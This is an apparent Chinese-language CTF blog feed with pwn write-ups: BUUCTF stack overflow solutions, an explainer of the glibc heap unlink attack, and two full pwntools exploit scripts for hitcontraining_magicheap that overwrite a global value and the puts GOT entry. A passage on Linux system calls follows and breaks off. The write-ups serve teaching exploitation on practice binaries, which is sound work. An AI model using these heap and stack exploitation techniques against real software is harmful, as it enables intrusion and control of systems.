src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-12.png"></p><p>可以发现程序中调用了system函数，只不过参数不是”bin&#x2F;sh”，然后我们接着看vulnerable_function()函数，返回的是read函数，且可以将变量buf写入，我们之后可以找到’bin&#x2F;sh’这个参数的地址为0x0804a024,然后我们就可以开始写exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">26707</span><span class="token punctuation">)</span>binsh_adr <span class="token operator">=</span> <span class="token number">0x0804A024</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804849E</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_adr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后我们可以获得flag，结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-13.png"></p><h3 id="3-题目来源—BUUCTF，bjdctf-2020-babystack"><a href="#3-题目来源—BUUCTF，bjdctf-2020-babystack" class="headerlink" title="3. 题目来源—BUUCTF，bjdctf_2020_babystack"></a>3. 题目来源—BUUCTF，bjdctf_2020_babystack</h3><p>首先我们对程序进行分析：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-14.png"></p><p>该程序为64位，开启了NX保护，试着运行一下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-15.png"></p><p>当我们输入的字符个数超出了指定的字符长度的时候，就会出现报错，我们放入ida进行反编译一下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-16.png"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-17.png"></p><p>我们在backdoor函数中发现了system函数，然后我们找到该函数的地址0x004006E6,通过分析该程序的代码，我们发现这个程序首先需要我们输入一个数，然后用它来决定我们后面变量buf的值，构建的exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25857</span><span class="token punctuation">)</span>sys_adr <span class="token operator">=</span> <span class="token number">0x004006e6</span>payload1 <span class="token operator">=</span> <span class="token string">b'-1'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_adr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name?'</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后我们成功获得flag，结果如下所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-18.png"></p>]]></content>
      
      
      <categories>
          
          <category> ret2dl_resolve,ret2VDSO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2dl_resolve </tag>
            
            <tag> ret2VDSO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink</title>
      <link href="/uncategorized/Unlink/"/>
      <url>/uncategorized/Unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>unlink，简称脱链，就是直接将链表头处的free堆块unsorted bin中脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块（向前或向后合并），再放入到unsorted bin中。</p><p>危害原理：通过伪造的free状态的fake_chunk，伪造fd指针和bk指针，通过绕过unlink的检测来实现unlink，unlink就会往p所在的位置写入p-0x18，从而实现任意地址写的漏洞。</p><p>漏洞产生的原因：offbynull、offbyone、堆溢出、修改了堆块的使用标志位</p><p>&#x2F;<em>malloc.c int_free函数中</em>&#x2F;</p><p>&#x2F;<em>这里p指向当前malloc_chunk结构体</em>&#x2F;</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span>（<span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>）<span class="token punctuation">&#123;</span>    prevsize <span class="token operator">=</span> p<span class="token operator">-></span>prev_size<span class="token punctuation">;</span>    size <span class="token operator">+=</span> prevsize<span class="token punctuation">;</span>    <span class="token comment">//修改指向当前chunk的指针，指向前一个chunk</span>    p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>bck<span class="token punctuation">,</span>fwd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*unlink操作的实质是：将p所指向的chunk从双向链表中移除，这里BK和FD用作临时变量*/</span>define <span class="token function">unlink</span><span class="token punctuation">(</span>P<span class="token punctuation">,</span>BK<span class="token punctuation">,</span>FD<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span>FD<span class="token operator">-></span>bk<span class="token operator">!=</span>P <span class="token operator">||</span> BK<span class="token operator">-></span>fd<span class="token operator">!=</span>P<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span><span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span>P<span class="token punctuation">,</span>AV<span class="token punctuation">)</span><span class="token punctuation">;</span>FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-绕过和利用"><a href="#0x01-绕过和利用" class="headerlink" title="0x01 绕过和利用"></a>0x01 绕过和利用</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">1</span>、伪造如下：chunk <span class="token operator">=</span> <span class="token number">0x0602280</span><span class="token punctuation">(</span>P是将要合并到的堆地址，P存在于chunk中，相当于<span class="token operator">*</span>chunk<span class="token operator">=</span>P<span class="token punctuation">)</span>P_fd <span class="token operator">=</span> chunk<span class="token operator">-</span><span class="token number">0x18</span> <span class="token operator">=</span> <span class="token number">0x602268</span>P_bk <span class="token operator">=</span> chunk<span class="token operator">-</span><span class="token number">0x10</span> <span class="token operator">=</span> <span class="token number">0x602270</span><span class="token number">2</span>、绕过技巧define <span class="token function">unlink</span><span class="token punctuation">(</span>P<span class="token punctuation">,</span>BK<span class="token punctuation">,</span>FD<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>  \\FD <span class="token operator">=</span> <span class="token number">0x602268</span>BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>  \\BK <span class="token operator">=</span> <span class="token number">0x602270</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span>FD<span class="token operator">-></span>bk<span class="token operator">!=</span>P <span class="token operator">||</span> BK<span class="token operator">-></span>fd<span class="token operator">!=</span>P<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         \\FD<span class="token operator">-></span>bk <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x602268</span><span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x602280</span><span class="token punctuation">)</span> <span class="token operator">=</span> P        \\BK<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x602270</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x602280</span><span class="token punctuation">)</span> <span class="token operator">=</span> P<span class="token punctuation">,</span>绕过！        <span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span><span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span>P<span class="token punctuation">,</span>AV<span class="token punctuation">)</span><span class="token punctuation">;</span>FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>  \\ <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x602268</span><span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x602280</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x602270</span>BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>  \\ <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x602270</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x602280</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x602268</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>最终效果就是往chunk里面写入了chunk<span class="token operator">-</span><span class="token number">0x18</span>的值。利用方法：首先edit堆的时候，将chunk的值修改为puts函数地址；第二次edit的时候，由于chunk的值已经修改为puts函数的地址，那么我们再对chunk进行修改就相当于对puts函数对应的地址进行修改，后面会有例题。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-实战"><a href="#0x02-实战" class="headerlink" title="0x02 实战"></a>0x02 实战</h2><p>题目来源：BUU hitcontraining_magicheap</p><p>首先放入ida中，进行反编译，得到一个典型的菜单题：</p><p>main():<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/20240118224107.png" alt="img"><br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/20240118224244.png" alt="img"></p><p>create_heap:</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/20240118224304.png" alt="img"></p><p>edit_heap():</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224324785.png" alt="image-20240118224324785"></p><p>delete_heap():</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224400569.png" alt="image-20240118224400569"></p><p>l33t():</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224420215.png" alt="image-20240118224420215"></p><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h3><p>由main函数可知，要使程序运行l33t函数，那么我就需要保证输入的值为4869，并且magic的值要大于0x1305，第一种办法就是修改magic的值，我们首先创建三个堆块，然后释放chunk1，同时chunk的堆块大小为0x91(包括prev_size+size)，这样它可以加入到unsorted bin中，另外我们再通过edit chunk0来修改chunk1的bk指针为magic-0x10，从而使得我们再次申请chunk的时候，会分配给我们magic的地址，接着对chunk1进行edit即可修改magic的值，脚本如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token comment">#p = remote("node5.buuoj.cn",29812)</span><span class="token keyword">def</span> <span class="token function">create_heap</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"choice :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Heap : "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"heap:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit_heap</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"choice :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Index :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Heap : "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"heap : "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_heap</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"choice :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Index :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x06020a0</span>create_heap<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>create_heap<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span>create_heap<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"cccc"</span><span class="token punctuation">)</span>delete_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit_heap<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_addr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create_heap<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"4869"</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(p)</span><span class="token comment">#pause()</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本地打通结果如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224442691.png" alt="image-20240118224442691"></p><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h3><p>第二种方法使用unlink的知识来解决，我们首先通过ida得到heaparray的地址，即存放chunk的首地址，也为chunk0的地址，接下来申请三个堆块，并伪造一个chunk，我们将heaparray_addr-0x18和heaparray_addr-0x10写入fakechunk的fd和bk指针，同时将chunk1的prevsize修改为0x90,size修改为0xa0，表示前面一个堆块的大小为0x90，并且没有被使用，那么我们在delete chunk1的时候，会将fakechunk和chunk1进行合并，然后进行unlink，我接下来通过图片来进行详细说明，注意每次断点截图的地址不一样，但效果是一样的：</p><p>在delete chunk1之前，我们的堆块如下所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224508758.png" alt="image-20240118224508758"></p><p>接着查看heaparray的值：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224535935.png" alt="image-20240118224535935"></p><p>此时，heaparray地址对应的值还没被修改为heaparray-0x18的地址，接着delete之后，得到的chunk分布如下所示：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224552638.png" alt="image-20240118224552638"></p><p>ok，因为heaparray里面存放的是chunk的地址，那么我们接下来对chunk0进行edit，是不是就相当于对heaparray-0x18这个地址的值进行修改，那么我们是不是就可以覆盖到chunk0的地址，所以第一次进行edit的时候，就是要将chunk0的地址修改为puts函数的地址，payload1&#x3D; p64(0)*3+p64(puts_got)，然后第二次进行edit chunk0的时候，就相当于对puts_got表的地址进行修改，payload2&#x3D;p64(l33t_addr)，截图如下：</p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224724496.png" alt="image-20240118224724496"></p><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224753717.png" alt="image-20240118224753717"></p><p>puts_got表地址已被修改为l33t函数的地址。</p><p>脚本如下所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./1"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_heap</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"choice :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Heap : "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"heap:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit_heap</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"choice :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Index :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Heap : "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"heap : "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_heap</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"choice :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Index :"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>l33t_addr <span class="token operator">=</span> <span class="token number">0x400c50</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>heaparray_addr <span class="token operator">=</span> <span class="token number">0x06020C0</span>create_heap<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>create_heap<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span>create_heap<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"cccc"</span><span class="token punctuation">)</span>fakechunk <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heaparray_addr<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heaparray_addr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span>fakechunk <span class="token operator">=</span> fakechunk<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">b"a"</span><span class="token punctuation">)</span>fakechunk <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span>edit_heap<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span>fakechunk<span class="token punctuation">)</span><span class="token comment">#pause()</span>delete_heap<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#pause()</span>edit_heap<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>edit_heap<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>l33t_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#delete_heap(0)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20240118224814185.png" alt="image-20240118224814185"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux下的系统调用</title>
      <link href="/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/linux%E4%B8%8B%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
      <url>/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/linux%E4%B8%8B%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="系统调用的原理"><a href="#系统调用的原理" class="headerlink" title="系统调用的原理"></a>系统调用的原理</h2><p>操作系统通过系统调用为运行于其上的进程提供服务。</p><p>当用户态进程发起一个系统调用， CPU 将切换到<strong>内核态</strong>并开始执行一个<strong>内核函数</strong>。 内核函数负责响应应用程序的要求。</p><p>之前看到过一篇文章，介绍了操作系统就像是一个代理一样，为我们去管理计算机的众多硬件，我们需要计算机的一些计算服务、数据管理的服务，都由操作系统提供接口来完成。这样做的好处是让一般的计算机使用者不用关心硬件的细节。</p><p>那对于操作系统来说系统通过接口的方式，建立了用户与计算机硬件的沟通方式，用户通过调用操作系统的接口来使用计算机的各种计算服务。</p><p>操作系统一般会提供两个重要的接口来满足用户的一些一般性的使用需求： </p><p>1、命令行：实际是一个叫bash&#x2F;sh的端终程序提供的功能，该程序底层的实质还是调用一些操作系统提供的函数。</p><p>2、窗口界面：窗口界面通过编写的窗口程序接收来自操作系统消息队列的一些鼠标、键盘动作，进而做出一些响应。</p><p>对于非一般性使用需求，操作系统提供了一系列的函数调用给软件开发者，由软件开发者来实现一些用户需要的功能。这些函数调用由于是操作系统内核提供的，为了有别于一般的函数调用，被称为<strong>系统调用</strong>。</p><p>这里举个例子，我们c语言使用下的printf函数，它的内部其实就是通过write这个系统调用，让操作系统内核将我们输入的字符打印在屏幕上。</p><h2 id="内核模式与用户模式"><a href="#内核模式与用户模式" class="headerlink" 